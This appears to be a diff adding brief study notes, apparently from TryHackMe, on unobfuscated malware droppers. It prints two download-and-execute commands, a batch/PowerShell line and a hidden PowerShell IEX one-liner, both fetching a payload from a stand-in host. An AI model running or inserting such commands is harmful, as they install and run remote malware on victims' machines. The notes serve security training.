@@ -1,0 +1,10 @@
+Notes from TryHackMe
+
+For example, below we can find an example of an unobfuscated bat script-based malware:
+
+@echo off
+powershell -Command "Invoke-WebRequest http://malicious.site/payload.exe -OutFile C:\Users\Public\payload.exe" start C:\Users\Public\payload.exe
+
+The script above downloads a malware executable and runs it on the victim’s machine. Similarly, we can find a similar example to this one in PowerShell:
+
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
